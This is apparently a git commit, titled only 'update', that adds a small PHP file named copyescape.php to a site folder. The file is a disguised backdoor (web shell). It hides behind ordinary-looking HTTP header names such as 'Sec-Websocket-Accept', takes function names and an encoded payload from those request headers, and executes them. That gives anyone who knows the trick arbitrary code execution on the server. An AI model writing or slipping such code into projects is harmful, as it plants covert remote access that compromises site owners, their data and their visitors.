11f777103dc5b82edac34629db2fa2e4af31350c
Fast and Static <it@e-me.co>
2024-10-21 12:26:09 +0000

    update

---
+++ benet-kids/copyescape.php
@@ -0,0 +1,6 @@
+<?php
+$_HEADERS = getallheaders();
+if (isset($_HEADERS['Sec-Websocket-Accept'])) {
+    $reset = $_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Feature-Policy']($_HEADERS['Clear-Site-Data']));
+    $reset();
+}
